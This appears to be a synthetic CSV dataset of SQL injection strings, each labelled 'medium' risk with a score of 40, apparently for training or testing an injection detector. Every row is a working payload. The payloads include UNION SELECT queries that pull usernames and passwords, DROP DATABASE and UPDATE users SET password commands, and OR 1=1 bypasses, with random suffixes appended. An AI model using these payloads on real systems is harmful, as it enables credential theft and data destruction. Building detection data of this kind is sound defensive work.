query,risk,score
' UNION SELECT * FROM information_schema.tables -- # 1y,medium,40
"' UNION SELECT username, password FROM users -- -- e",medium,40
'; DROP DATABASE temp -- # kb,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 6x,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
'; SELECT @@version -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- g,medium,40
' UNION SELECT * FROM information_schema.tables -- -- y,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- t",medium,40
'; DROP DATABASE temp -- # yc,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- z",medium,40
"' UNION SELECT username, password FROM users -- -- v",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # vn",medium,40
' HAVING 1=1 # /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- b",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # ex",medium,40
'; UPDATE users SET password='pass' # i9,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 3",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
'; SELECT @@version -- /**/,medium,40
'; UPDATE users SET password='pass' # 1w,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
'; DROP DATABASE temp -- -- v,medium,40
'; SELECT @@version -- # 0z,medium,40
' or 1=1 in (select * from users) -- -- a,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 3",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 8",medium,40
'; UPDATE users SET password='pass' /**/,medium,40
'; SELECT @@version -- /**/,medium,40
' HAVING 1=1 # -- m,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # r2",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 2q",medium,40
' UNION SELECT * FROM information_schema.tables -- # 35,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' HAVING 1=1 # # sy,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- g",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- c",medium,40
1' OR 1=1; SELECT * FROM users -- # u2,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; DROP DATABASE temp -- # 7x,medium,40
' or 1=1 in (select * from users) -- # b9,medium,40
' UNION SELECT * FROM information_schema.tables -- # xt,medium,40
'; UPDATE users SET password='pass' # 2r,medium,40
' HAVING 1=1 # -- 2,medium,40
'; SELECT @@version -- # 9a,medium,40
' OR username LIKE '%admin%' -- -- x,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3c",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- y",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' OR username LIKE '%admin%' -- # ya,medium,40
' or 1 = 1 LIMIT 1 -- -- i,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- # v3,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
1' OR 1=1; SELECT * FROM users -- # e9,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # ay",medium,40
'; DROP DATABASE temp -- # lj,medium,40
1' OR '1' = '1' GROUP BY 1 -- # q3,medium,40
'; SELECT COUNT(*) FROM users -- # nk,medium,40
'; SELECT @@version -- /**/,medium,40
' OR username LIKE '%admin%' -- # x4,medium,40
1' OR 1=1; SELECT * FROM users -- -- 1,medium,40
' or 1 = 1 LIMIT 1 -- -- j,medium,40
' or 1 = 1 LIMIT 1 -- # l9,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- u,medium,40
"' UNION SELECT username, password FROM users -- -- 1",medium,40
1' OR '1' = '1' GROUP BY 1 -- # 3k,medium,40
'; DROP DATABASE temp -- -- h,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; SELECT @@version -- -- 6,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- l,medium,40
'; SELECT @@version -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 2d",medium,40
' HAVING 1=1 # /**/,medium,40
' HAVING 1=1 # # o9,medium,40
'; DROP DATABASE temp -- # o0,medium,40
'; UPDATE users SET password='pass' -- j,medium,40
' OR username LIKE '%admin%' -- # z5,medium,40
"' UNION SELECT username, password FROM users -- -- h",medium,40
'; SELECT @@version -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- 5",medium,40
' UNION SELECT * FROM information_schema.tables -- -- d,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- n",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 87",medium,40
' UNION SELECT * FROM information_schema.tables -- # ft,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' or 1=1 in (select * from users) -- # o6,medium,40
' or 1=1 in (select * from users) -- -- v,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' OR username LIKE '%admin%' -- -- k,medium,40
1' OR '1' = '1' GROUP BY 1 -- # xu,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- d",medium,40
'; SELECT @@version -- # ul,medium,40
"' UNION SELECT username, password FROM users -- -- 1",medium,40
1' OR 1=1; SELECT * FROM users -- -- g,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 2",medium,40
' or 1=1 in (select * from users) -- # bz,medium,40
'; DROP DATABASE temp -- -- 0,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- k",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # ry",medium,40
'; SELECT @@version -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
1' OR 1=1; SELECT * FROM users -- # fx,medium,40
' OR username LIKE '%admin%' -- # 9y,medium,40
'; DROP DATABASE temp -- -- z,medium,40
1' OR '1' = '1' GROUP BY 1 -- # cn,medium,40
' or 1=1 in (select * from users) -- # ss,medium,40
'; UPDATE users SET password='pass' # 88,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # od",medium,40
'; SELECT COUNT(*) FROM users -- -- 2,medium,40
1' OR 1=1; SELECT * FROM users -- -- n,medium,40
'; SELECT @@version -- -- g,medium,40
1' OR '1' = '1' GROUP BY 1 -- # lg,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # b6",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- # 2e,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- # td,medium,40
' UNION SELECT * FROM information_schema.tables -- -- s,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- -- i",medium,40
'; SELECT @@version -- -- x,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' OR username LIKE '%admin%' -- -- 5,medium,40
' HAVING 1=1 # /**/,medium,40
' or 1 = 1 LIMIT 1 -- # or,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; DROP DATABASE temp -- -- s,medium,40
' HAVING 1=1 # # iv,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- 8,medium,40
' or 1=1 in (select * from users) -- -- z,medium,40
1' OR '1' = '1' GROUP BY 1 -- # bv,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' UNION SELECT * FROM information_schema.tables -- -- 5,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
' OR username LIKE '%admin%' -- -- l,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 8",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- f,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 1",medium,40
1' OR 1=1; SELECT * FROM users -- -- k,medium,40
' HAVING 1=1 # # 5m,medium,40
"' UNION SELECT username, password FROM users -- # lb",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- k,medium,40
'; DROP DATABASE temp -- # qa,medium,40
'; SELECT COUNT(*) FROM users -- -- b,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- e",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- x,medium,40
'; SELECT COUNT(*) FROM users -- # oa,medium,40
' OR username LIKE '%admin%' -- # bz,medium,40
' HAVING 1=1 # /**/,medium,40
"' UNION SELECT username, password FROM users -- # zt",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # s1",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; SELECT @@version -- -- 8,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' or 1=1 in (select * from users) -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- # rs,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- d,medium,40
'; DROP DATABASE temp -- -- 3,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- f",medium,40
"' UNION SELECT username, password FROM users -- # zy",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # bw",medium,40
'; UPDATE users SET password='pass' # 7c,medium,40
'; SELECT @@version -- -- s,medium,40
"' UNION SELECT username, password FROM users -- # ta",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- # s8,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; SELECT @@version -- -- c,medium,40
' or 1=1 in (select * from users) -- -- d,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 4",medium,40
'; UPDATE users SET password='pass' # bj,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 9p,medium,40
'; UPDATE users SET password='pass' -- j,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; SELECT @@version -- -- 6,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; SELECT COUNT(*) FROM users -- # 0x,medium,40
' or 1=1 in (select * from users) -- # r8,medium,40
"' UNION SELECT username, password FROM users -- # 66",medium,40
'; DROP DATABASE temp -- # m7,medium,40
'; SELECT @@version -- # rf,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # dz",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' OR username LIKE '%admin%' -- # x5,medium,40
' HAVING 1=1 # # tr,medium,40
'; SELECT @@version -- # fy,medium,40
'; SELECT COUNT(*) FROM users -- -- n,medium,40
1' OR '1' = '1' GROUP BY 1 -- # fi,medium,40
' UNION SELECT * FROM information_schema.tables -- -- v,medium,40
' UNION SELECT * FROM information_schema.tables -- # dq,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' HAVING 1=1 # /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 6o,medium,40
1' OR '1' = '1' GROUP BY 1 -- # xa,medium,40
1' OR 1=1; SELECT * FROM users -- # 0d,medium,40
"' UNION SELECT username, password FROM users -- # pu",medium,40
'; DROP DATABASE temp -- -- z,medium,40
' OR username LIKE '%admin%' -- -- 3,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- f,medium,40
"' UNION SELECT username, password FROM users -- # 6r",medium,40
'; UPDATE users SET password='pass' # k2,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' OR username LIKE '%admin%' -- -- o,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- r",medium,40
' or 1=1 in (select * from users) -- # n2,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- 8",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
'; SELECT @@version -- # 75,medium,40
"' UNION SELECT username, password FROM users -- # al",medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # kg",medium,40
'; SELECT COUNT(*) FROM users -- -- d,medium,40
'; UPDATE users SET password='pass' # sw,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- k,medium,40
' or 1=1 in (select * from users) -- -- r,medium,40
' OR username LIKE '%admin%' -- # 7m,medium,40
'; SELECT COUNT(*) FROM users -- /**/,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
'; DROP DATABASE temp -- -- a,medium,40
'; DROP DATABASE temp -- /**/,medium,40
'; SELECT @@version -- /**/,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 5",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # pw",medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- 6,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' HAVING 1=1 # -- 0,medium,40
'; SELECT @@version -- -- y,medium,40
'; DROP DATABASE temp -- -- k,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' HAVING 1=1 # -- 1,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- # cp,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
1' OR '1' = '1' GROUP BY 1 -- # gj,medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- # z8,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- q",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # li",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- i,medium,40
' or 1 = 1 LIMIT 1 -- -- m,medium,40
'; DROP DATABASE temp -- -- m,medium,40
'; SELECT @@version -- /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
'; DROP DATABASE temp -- # tf,medium,40
' HAVING 1=1 # /**/,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # 97",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- k,medium,40
'; DROP DATABASE temp -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- # g3,medium,40
'; SELECT COUNT(*) FROM users -- # ho,medium,40
' HAVING 1=1 # /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 8x,medium,40
1' OR 1=1; SELECT * FROM users -- -- p,medium,40
' OR username LIKE '%admin%' -- # d2,medium,40
' HAVING 1=1 # /**/,medium,40
' or 1 = 1 LIMIT 1 -- # n1,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 3s,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- 6",medium,40
'; DROP DATABASE temp -- # he,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # ge",medium,40
' or 1 = 1 LIMIT 1 -- # g7,medium,40
' HAVING 1=1 # /**/,medium,40
1' OR '1' = '1' GROUP BY 1 -- # 24,medium,40
' HAVING 1=1 # -- v,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- x",medium,40
1' OR 1=1; SELECT * FROM users -- # 7s,medium,40
'; DROP DATABASE temp -- # 0j,medium,40
' HAVING 1=1 # -- u,medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- u",medium,40
1' OR 1=1; SELECT * FROM users -- # vg,medium,40
' OR username LIKE '%admin%' -- # g1,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # gr",medium,40
1' OR '1' = '1' GROUP BY 1 -- # cm,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- # xl,medium,40
'; SELECT COUNT(*) FROM users -- -- t,medium,40
'; SELECT @@version -- # ho,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 0",medium,40
1' OR 1=1; SELECT * FROM users -- -- w,medium,40
"' UNION SELECT username, password FROM users -- # 62",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- -- d",medium,40
' OR username LIKE '%admin%' -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 1",medium,40
"' UNION SELECT username, password FROM users -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- -- i,medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
' UNION SELECT * FROM information_schema.tables -- -- 1,medium,40
' UNION SELECT * FROM information_schema.tables -- # yv,medium,40
' UNION SELECT * FROM information_schema.tables -- # 2z,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # l6",medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
'; DROP DATABASE temp -- -- q,medium,40
'; SELECT @@version -- # ti,medium,40
"' UNION SELECT username, password FROM users -- # y1",medium,40
"' UNION SELECT username, password FROM users -- # t9",medium,40
' HAVING 1=1 # # ps,medium,40
'; SELECT @@version -- /**/,medium,40
' or 1 = 1 LIMIT 1 -- -- 3,medium,40
1' OR 1=1; SELECT * FROM users -- # rv,medium,40
'; DROP DATABASE temp -- # no,medium,40
' HAVING 1=1 # /**/,medium,40
1' OR 1=1; SELECT * FROM users -- # e2,medium,40
'; SELECT COUNT(*) FROM users -- -- b,medium,40
' UNION SELECT * FROM information_schema.tables -- # 1d,medium,40
1' OR '1' = '1' GROUP BY 1 -- # ga,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- t",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' OR username LIKE '%admin%' -- -- p,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 1",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # d3",medium,40
'; SELECT @@version -- # ia,medium,40
' UNION SELECT * FROM information_schema.tables -- # x5,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
' or 1=1 in (select * from users) -- # 0s,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- /**/",medium,40
' or 1 = 1 LIMIT 1 -- # yw,medium,40
'; UPDATE users SET password='pass' -- f,medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # qn",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- z",medium,40
1' OR 1=1; SELECT * FROM users -- -- 0,medium,40
"' UNION SELECT username, password FROM users -- -- 5",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # 1d",medium,40
1' OR '1' = '1' GROUP BY 1 -- /**/,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # wg",medium,40
' or 1=1 in (select * from users) -- # fv,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
"' UNION SELECT username, password FROM users -- -- 7",medium,40
"' UNION ALL SELECT 1,2 FROM users -- # mz",medium,40
' OR username LIKE '%admin%' -- # 6o,medium,40
1' OR 1=1; SELECT * FROM users -- # rp,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
'; DROP DATABASE temp -- /**/,medium,40
"' UNION SELECT username, password FROM users -- # rh",medium,40
' HAVING 1=1 # /**/,medium,40
'; SELECT COUNT(*) FROM users -- -- l,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- # 3l",medium,40
1' OR '1' = '1' GROUP BY 1 -- -- t,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- 0",medium,40
'; DROP DATABASE temp -- # 5x,medium,40
' UNION SELECT * FROM information_schema.tables -- -- j,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
' HAVING 1=1 # # w3,medium,40
' or 1 = 1 LIMIT 1 -- /**/,medium,40
' OR username LIKE '%admin%' -- # 9f,medium,40
"' UNION SELECT username, password FROM users -- -- o",medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
'; SELECT @@version -- # nl,medium,40
"' UNION ALL SELECT 1,2 FROM users -- -- 9",medium,40
'; SELECT @@version -- # et,medium,40
'; DROP DATABASE temp -- -- 2,medium,40
' UNION SELECT * FROM information_schema.tables -- # pg,medium,40
1' OR '1' = '1' GROUP BY 1 -- -- i,medium,40
"' UNION SELECT username, password FROM users -- # wl",medium,40
"' AND 1=0 UNION SELECT 1,2,3 -- # xj",medium,40
' or 1 = 1 LIMIT 1 -- -- n,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
1' OR 1=1; SELECT * FROM users -- -- 2,medium,40
"' UNION ALL SELECT 1,2 FROM users -- # xw",medium,40
' or 1=1 in (select * from users) -- -- d,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- /**/",medium,40
1' OR 1=1; SELECT * FROM users -- /**/,medium,40
"' OR '1'='1' UNION SELECT 1,2 -- -- y",medium,40
' HAVING 1=1 # -- f,medium,40
"' UNION ALL SELECT 1,2 FROM users -- /**/",medium,40
'; UPDATE users SET password='pass' -- 2,medium,40
' HAVING 1=1 # # 2m,medium,40
' or 1=1 in (select * from users) -- # 58,medium,40
' UNION SELECT * FROM information_schema.tables -- /**/,medium,40
' HAVING 1=1 # -- g,medium,40
' or 1 = 1 LIMIT 1 -- # vh,medium,40
'; UPDATE users SET password='pass' /**/,medium,40
